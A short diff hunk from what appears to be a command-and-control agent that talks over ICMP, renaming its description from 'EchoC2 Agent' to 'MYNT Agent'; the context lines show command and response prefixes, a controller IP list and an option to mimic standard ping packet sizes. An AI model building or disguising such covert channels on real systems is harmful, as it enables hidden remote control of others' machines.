@@ -8,7 +8,7 @@ COMMAND_PREFIX = b"CMD_EXEC:"
 RESPONSE_PREFIX = b"CMD_RESPONSE:"
 CONTROLLER_IPS = ['192.168.13.104']
 def parse_arguments():
-    parser = argparse.ArgumentParser(description='EchoC2 Agent')
+    parser = argparse.ArgumentParser(description='MYNT Agent')
     parser.add_argument('--size', type=int, default=1024,
                         help='Max packet size (default: 1024). Use 84 to mimic standard ICMP packet lengths.')
     args = parser.parse_args()
